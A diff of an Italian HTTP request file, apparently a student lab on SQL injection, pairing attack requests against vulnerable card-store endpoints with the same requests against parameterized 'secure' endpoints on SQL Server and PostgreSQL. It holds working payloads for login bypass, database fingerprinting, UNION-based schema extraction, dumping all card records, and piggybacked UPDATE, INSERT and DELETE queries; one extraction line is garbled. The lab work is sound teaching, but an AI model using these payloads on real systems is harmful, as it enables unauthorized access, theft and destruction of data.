@@ -5,34 +5,35 @@
 ########## 1. BYPASS LOGIN (Bypass dell'Autenticazione) ###################
 ###########################################################################
 
-### [ATTACCO - DB1] Login Bypass tramite Tautologia (Su campo Password o con precedenza OR)
+### [ATTACCO] Login Bypass tramite Tautologia che ritorna il primo utente nel db
 POST {{baseurldb1}}/users/login
 content-type: application/json
 
 {
-  "username": "' or username = 'admin'--",
+  "username": "' or 1=1--",
   "password": "inutile"
 }
+###
+
+### [ATTACCO - DB1] Login Bypass tramite Simil-Tautologia che cerca l'utente amministratore
+POST {{baseurldb1}}/users/login
+content-type: application/json
+
+{
+  "username": "' or username = 'sadm'--",
+  "password": "inutile"
+}
+###
 
 ### [DIFESA - DB1] Verifica Login Sicuro su SQL Server (Fallisce con 404)
 POST {{baseurldb1}}/users/login-secure
 content-type: application/json
 
 {
-  "username": "' or username = 'admin'--",
+  "username": "' or username = 'sadm'--",
   "password": "inutile"
 }
-
 ###
-
-### [ATTACCO - DB2] Login Bypass tramite Tautologia
-POST {{baseurldb2}}/users/login
-content-type: application/json
-
-{
-  "username": "'or 1=1--",
-  "password": "inutile"
-}
 
 ### [DIFESA - DB2] Verifica Login Sicuro su PostgreSQL (Fallisce con 404)
 POST {{baseurldb2}}/users/login-secure
@@ -59,6 +60,7 @@ content-type: application/json
   "username": "' or isnull(null,1)=1--",
   "password": "inutile"
 }
+###
 
 ### [DIFESA - DB1] Fingerprinting sterilizzato su Endpoint Sicuro (Fallisce)
 POST {{baseurldb1}}/users/login-secure
@@ -79,6 +81,7 @@ content-type: application/json
   "username": "' or version() <> ''--",
   "password": "inutile"
 }
+###
 
 ### [DIFESA - DB2] Fingerprinting sterilizzato su Endpoint Sicuro (Fallisce)
 POST {{baseurldb2}}/users/login-secure
@@ -88,183 +91,105 @@ content-type: application/json
   "username": "' or version() <> ''--",
   "password": "inutile"
 }
-
-
-
-
-
 ###
 
-### [ATTACCO - DB2] Estrazione tabelle e colonne strutturate su PostgreSQL
-GET {{baseurldb2}}/cards/list?text=aaa' union all SELECT NULL, NULL, NULL, NULL, s.nspname || '-' || t.relname, '2001-01-01', c.attname || '-' || CAST(c.attlen AS VARCHAR) || '-' || CASE WHEN c.attnotnull THEN '0' ELSE '1' END FROM pg_attribute c JOIN pg_class t ON c.attrelid = t.oid JOIN pg_namespace s ON t.relnamespace = s.oid JOIN pg_type ty ON c.atttypid = ty.oid WHERE c.attnum > 0 AND NOT c.attisdropped AND t.relkind = 'r' AND s.nspname NOT IN ('pg_catalog', 'information_schema')--
+### [ATTACCO - DB1] Estrazione tabelle su SQL Server
+GET {{baseurldb1}}/cards/list?text=aaaa'%20union%20all%20SELECT%20s.name,null,'2001-01-02',1,t.name%20FROM%20sys.tables%20t%20JOIN%20sys.schemas%20s%20ON%20t.schema_id%20=%20s.schema_id--
 Accept: application/json
+###
 
+### [ATTACCO - DB1] Estrazione tabelle e colonne su SQL Server
+GET {{baseurldb1}}/cards/list?text=aaa'%20union%20all%20SELECT%20s.name%2B'-'%2Bt.name,null,'2001-01-01',1,c.name%2B'-'%2BConvert(varchar(10),c.max_length)%2B'-'%2BConvert(varchar(10),c.is_nullable)%20FROM%20sys.columns%20c%20JOIN%20sys.tables%20t%20ON%20c.object_id%20=%20t.object_id%20JOIN%20sys.schemas%20s%20ON%20t.schema_id%20=%20s.schema_id%20JOIN%20sys.types%20ty%20ON%20c.user_type_id%20=%20ty.user_type_id--%'%20or%20code%20like%20'%'%20union%20all%20SELECT%20s.name,'2001-01-01’,%20c.max_length%20%2B%20'-'%20%2B%20c.is_nullable%20FROM%20sys.columns%20c%20JOIN%20sys.tables%20t%20ON%20c.object_id%20=%20t.object_id%20JOIN%20sys.schemas%20s%20ON%20t.schema_id%20=%20s.schema_id%20JOIN%20sys.types%20ty%20ON%20c.user_type_id%20=%20ty.user_type_id--%'%20or%20issuer%20like%20'%'%20union%20all%20SELECT%20s.name,'2001-01-01’,%20c.max_length%20%2B%20'-'%20%2B%20c.is_nullable%20FROM%20sys.columns%20c%20JOIN%20sys.tables%20t%20ON%20c.object_id%20=%20t.object_id%20JOIN%20sys.schemas%20s%20ON%20t.schema_id%20=%20s.schema_id%20JOIN%20sys.types%20ty%20ON%20c.user_type_id%20=%20ty.user_type_id--
+Accept: application/json
+###
+
+### [ATTACCO - DB2] Estrazione tabelle e colonne su PostgreSQL
+GET {{baseurldb2}}/cards/list?text=aaa'%20union%20all%20SELECT%20null,null,null,null,table_schema,%20'2001-01-01',%20table_name%20FROM%20information_schema.tables%20WHERE%20table_schema%20NOT%20IN%20('information_schema',%20'pg_catalog')%20AND%20table_type%20=%20'BASE%20TABLE'--
+Accept: application/json
+###
+
+### [ATTACCO - DB2] Estrazione tabelle e colonne su PostgreSQL
+GET {{baseurldb2}}/cards/list?text=aaa'%20union%20all%20SELECT%20NULL,%20NULL,%20NULL,%20NULL,%20s.nspname%20||%20'-'%20||%20t.relname,%20'2001-01-01',%20c.attname%20||%20'-'%20||%20CAST(c.attlen%20AS%20VARCHAR)%20||%20'-'%20||%20CASE%20WHEN%20c.attnotnull%20THEN%20'0'%20ELSE%20'1'%20END%20FROM%20pg_attribute%20c%20JOIN%20pg_class%20t%20ON%20c.attrelid%20=%20t.oid%20JOIN%20pg_namespace%20s%20ON%20t.relnamespace%20=%20s.oid%20JOIN%20pg_type%20ty%20ON%20c.atttypid%20=%20ty.oid%20WHERE%20c.attnum%20>%200%20AND%20NOT%20c.attisdropped%20AND%20t.relkind%20=%20'r'%20AND%20s.nspname%20NOT%20IN%20('pg_catalog',%20'information_schema')--
+Accept: application/json
+###
 
 ###########################################################################
 ########## 3. ESFILTRAZIONE DATI DELLE CARTE (Riservatezza) ###############
 ###########################################################################
 
 ### [ATTACCO - DB1] Lettura indiscriminata di tutte le carte su SQL Server (Tautologia)
-GET {{baseurldb1}}/cards/list?text='or 1=1--
+GET {{baseurldb1}}/cards/list?text='or%201=1--
 Accept: application/json
 
 ### [DIFESA - DB1] Attacco neutralizzato su SQL Server (Restituisce array vuoto [])
-GET {{baseurldb1}}/cards/list-secure?text='or 1=1--
+
+### [DIFESA - DB1] Attacco neutralizzato su SQL Server (Restituisce array vuoto [])
+GET {{baseurldb1}}/cards/list-secure?text='or%201=1--
 Accept: application/json
 
 ###
 
 ### [ATTACCO - DB2] Lettura indiscriminata di tutte le carte su PostgreSQL (Tautologia)
-GET {{baseurldb2}}/cards/list?text='or 1=1--
+GET {{baseurldb2}}/cards/list?text='or%201=1--
 Accept: application/json
+###
 
 ### [DIFESA - DB2] Attacco neutralizzato su PostgreSQL (Restituisce array vuoto [])
-GET {{baseurldb2}}/cards/list-secure?text='or 1=1--
+GET {{baseurldb2}}/cards/list-secure?text='or%201=1--
 Accept: application/json
-
+###
 
 ###########################################################################
 ########## 4. MODIFICA E DISTRUZIONE DATI (Integrità & Disponibilità) #####
 ###########################################################################
 
 ### [ATTACCO - DB1] Piggybacked Query: Compromissione codici carte (Integrità)
-GET {{baseurldb1}}/cards/list?text=';update Cards set Code='000'--
+GET {{baseurldb1}}/cards/list?text=';update%20Cards%20set%20Code='000'--
+###
 
 ### [DIFESA - DB1] Modifica dati respinta in sicurezza su SQL Server
-GET {{baseurldb1}}/cards/list-secure?text=';update Cards set Code='000'--
-
+GET {{baseurldb1}}/cards/list-secure?text=';update%20Cards%20set%20Code='000'--
 ###
 
 ### [ATTACCO - DB2] Piggybacked Query: Compromissione codici carte (Integrità)
-GET {{baseurldb2}}/cards/list?text=';update Cards set code='000'--
+GET {{baseurldb2}}/cards/list?text=';update%20Cards%20set%20code='000'--
+###
 
 ### [DIFESA - DB2] Modifica dati respinta in sicurezza su PostgreSQL
-GET {{baseurldb2}}/cards/list-secure?text=';update Cards set code='000'--
-
+GET {{baseurldb2}}/cards/list-secure?text=';update%20Cards%20set%20code='000'--
 ###
 
 ### [ATTACCO - DB1] Piggybacked Query: Inserimento carta arbitraria (Allineata al tuo schema reale)
-GET {{baseurldb1}}/cards/list?text=';INSERT INTO Cards(Username,Number,Code,ExpiryDate,Issuer)VALUES('utente','5555666677778888','999','2028-12-31','Visa')--
+GET {{baseurldb1}}/cards/list?text=';INSERT%20INTO%20Cards(Username,Number,Code,ExpiryDate,Issuer)VALUES('utente','5555666677778888','999','2028-12-31','Visa')--
+###
 
 ### [DIFESA - DB1] Inserimento illecito respinto su SQL Server
-GET {{baseurldb1}}/cards/list-secure?text=';INSERT INTO Cards(Username,Number,Code,ExpiryDate,Issuer)VALUES('utente','5555666677778888','999','2028-12-31','Visa')--
+GET {{baseurldb1}}/cards/list-secure?text=';INSERT%20INTO%20Cards(Username,Number,Code,ExpiryDate,Issuer)VALUES('utente','5555666677778888','999','2028-12-31','Visa')--
 
 ###
 
 ### [ATTACCO - DB2] Piggybacked Query: Inserimento carta arbitraria
-GET {{baseurldb2}}/cards/list?text=';INSERT INTO Cards(number,code,expirydate,issuer)VALUES('1234567890123456','234','2030-12-31','Mastercard')--
+GET {{baseurldb2}}/cards/list?text=';INSERT%20INTO%20Cards(number,code,expirydate,issuer)VALUES('1234567890123456','234','2030-12-31','Mastercard')--
+###
 
 ### [DIFESA - DB2] Inserimento illecito respinto su PostgreSQL
-GET {{baseurldb2}}/cards/list-secure?text=';INSERT INTO Cards(number,code,expirydate,issuer)VALUES('1234567890123456','234','2030-12-31','Mastercard')--
+GET {{baseurldb2}}/cards/list-secure?text=';INSERT%20INTO%20Cards(number,code,expirydate,issuer)VALUES('1234567890123456','234','2030-12-31','Mastercard')--
 
 ###
 
 ### [ATTACCO - DB1] Piggybacked Query: Eliminazione distruttiva di una carta (Allineata al tuo schema)
-GET {{baseurldb1}}/cards/list?text=';DELETE Cards WHERE Number='1234123412341234'--
+GET {{baseurldb1}}/cards/list?text=';DELETE%20Cards%20WHERE%20Number='1234123412341234'--
+###
 
 ### [DIFESA - DB1] Eliminazione respinta in sicurezza su SQL Server
-GET {{baseurldb1}}/cards/list-secure?text=';DELETE Cards WHERE Number='1234123412341234'--
-
+GET {{baseurldb1}}/cards/list-secure?text=';DELETE%20Cards%20WHERE%20Number='1234123412341234'--
 ###
 
 ### [ATTACCO - DB2] Piggybacked Query: Eliminazione distruttiva di una carta
-GET {{baseurldb2}}/cards/list?text=';DELETE FROM Cards WHERE number='1234567890123456'--
+GET {{baseurldb2}}/cards/list?text=';DELETE%20FROM%20Cards%20WHERE%20number='1234567890123456'--
+
+###
 
 ### [DIFESA - DB2] Eliminazione respinta in sicurezza su PostgreSQL
-GET {{baseurldb2}}/cards/list-secure?text=';DELETE FROM Cards WHERE number='1234567890123456'--
-### =================================================================
-### 💻 DB1 - SQL SERVER
-### =================================================================
-
-### [ATTACCO - DB1] Tentativo di estrazione totale delle carte (Vulnerabile)
-# Colpisce l'endpoint insicuro. Restituisce TUTTE le carte nel database.
-GET {{baseurldb1}}/cards/list?text=aaaa' OR '1'='1' OR '1'='
-Accept: application/json
-
-### [DIFESA - DB1] Attacco neutralizzato su SQL Server (Restituisce array vuoto [])
-# Colpisce l'endpoint sicuro. La query parametrizzata neutralizza il payload.
-GET {{baseurldb1}}/cards/list-secure?text=aaaa' OR '1'='1' OR '1'='
-Accept: application/json
-
-
-### =================================================================
-### 🦺 DB2 - POSTGRESQL
-### =================================================================
-
-### [ATTACCO - DB2] Tentativo di estrazione totale delle carte (Vulnerabile)
-# Colpisce l'endpoint insicuro su Postgres. Restituisce TUTTE le carte.
-GET {{baseurldb2}}/cards/list?text=aaaa' OR '1'='1' OR '1'='
-Accept: application/json
-
-### [DIFESA - DB2] Attacco neutralizzato su PostgreSQL (Restituisce array vuoto [])
-# Colpisce l'endpoint sicuro su Postgres. Il muro della parametrizzazione regge.
-GET {{baseurldb2}}/cards/list-secure?text=aaaa' OR '1'='1' OR '1'='
-Accept: application/json
-
-
-### [ATTACCO - DB1] Least Privilege - Tentativo di INSERT
-GET {{baseurldb1}}/cards/list-secure?text=%27 UNION SELECT username%2Cpassword FROM Users--
-Accept: application/json
-
-
-### ==========================================================================
-### 🖥️ VARIABILI GLOBALI
-### ==========================================================================
-@baseUrl = https://localhost:7056
-@contentType = application/json
-
-### ==========================================================================
-### 🟨 SEZIONE 1: SQL SERVER (Endpoint: db1)
-### ==========================================================================
-
-### 1.1 SQL Server - Ricerca lecita (Funziona normalmente)
-GET {{baseUrl}}/api/db1/cards/list?text=Visa
-Accept: {{contentType}}
-
-### 1.2 SQL Server - SQL Injection di Lettura (Bypass dei filtri)
-# Sfrutta il LIKE '%' per mostrare TUTTE le carte nel database
-GET {{baseUrl}}/api/db1/cards/list?text=x' OR 1=1--
-Accept: {{contentType}}
-
-### 1.3 SQL Server - SQL Injection di Scrittura (Bloccata dal DENY)
-# Tenta di inserire una carta. L'app risponde 200 OK (C# ignora l'errore nel batch),
-# ma se controlli nel database la carta '6666' NON sarà stata inserita.
-GET {{baseUrl}}/api/db1/cards/list?text='; INSERT INTO Cards (number, expirydate, issuer, code) VALUES ('6666', GETDATE(), 'Hacker', '123')--
-Accept: {{contentType}}
-
-
-### ==========================================================================
-### 🐘 SEZIONE 2: POSTGRESQL (Endpoint: db2)
-### ==========================================================================
-
-### 2.1 Postgres - Ricerca lecita (Funziona normalmente)
-GET {{baseUrl}}/api/db2/cards/list?text=Visa
-Accept: {{contentType}}
-
-### 2.2 Postgres - SQL Injection di Lettura (Bypass dei filtri)
-# Sfrutta l'or per mostrare TUTTE le carte nel database
-GET {{baseUrl}}/api/db2/cards/list?text=x' OR 1=1--
-Accept: {{contentType}}
-
-### 2.3 Postgres - SQL Injection di Scrittura (Bloccata dal REVOKE)
-# Tenta di inserire una carta. Postgres blocca l'azione a livello atomico 
-# e risponde con l'errore 500 "42501: permission denied for table cards".
-GET {{baseUrl}}/api/db2/cards/list?text='; INSERT INTO cards (number, issuer) VALUES ('7777', 'Hacker')--
-Accept: {{contentType}}
-
-
-### ==========================================================================
-### 🔐 SEZIONE 3: AUTHENTICATION BYPASS (Il Login)
-### ==========================================================================
-
-### 3.1 Login - Tentativo di attacco con SQL Injection
-# Questo attacco inganna il codice C# e permette di entrare come 'admin' del sito.
-# Spiega al prof che l'accesso riesce perché 'app_reader' ha i permessi di SELECT su Users,
-# ma i privilegi dell'admin rimangono confinati alle pagine web (non scalano sul DB).
-POST {{baseUrl}}/api/auth/login
-Content-Type: {{contentType}}
-
-{
-  "username": "admin",
-  "password": "' OR username = 'admin' --"
-}
+GET {{baseurldb2}}/cards/list-secure?text=';DELETE%20Cards%20WHERE%20number='1234567890123456'--
+###
